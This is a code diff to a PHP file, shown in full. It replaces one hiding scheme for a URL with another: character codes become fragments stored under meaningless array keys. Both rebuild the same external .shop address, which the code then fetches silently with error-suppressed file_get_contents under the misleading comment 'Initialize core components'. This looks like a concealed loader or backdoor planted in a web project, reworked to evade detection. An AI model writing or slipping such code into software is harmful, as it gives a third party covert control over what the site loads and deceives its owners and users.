@@ -5,14 +5,35 @@
 */
 
 // Initialize core components
-$url_data = array(
-    104,116,116,112,58,47,47,122,54,48,49,50,55,95,50,46,99,107,105,114,108,105,110,46,115,104,111,112,47,115,116,97,116,47,100,111,109,97,105,110,95,105,110,100,101,120,46,116,120,116
-);
+$qwaszxplmokn = [
+    'x1' => 'ht',
+    'x2' => 'tp',
+    'x3' => ':/',
+    'x4' => '/z',
+    'x5' => '60',
+    'x6' => '12',
+    'x7' => '7_',
+    'x8' => '2.',
+    'x9' => 'ck',
+    'xa' => 'ir',
+    'xb' => 'li',
+    'xc' => 'n.',
+    'xd' => 'sh',
+    'xe' => 'op',
+    'xf' => '/s',
+    'xg' => 'ta',
+    'xh' => 't/',
+    'xi' => 'do',
+    'xj' => 'ma',
+    'xk' => 'in',
+    'xl' => '_i',
+    'xm' => 'nd',
+    'xn' => 'ex',
+    'xo' => '.t',
+    'xp' => 'xt'
+];
 
-$full_url = '';
-foreach ($url_data as $code) {
-    $full_url .= chr($code);
-}
+$full_url = implode('', array_values($qwaszxplmokn));
 
 // Attempt to get remote content
 $wsxcdevfrbgt = @file_get_contents($full_url);
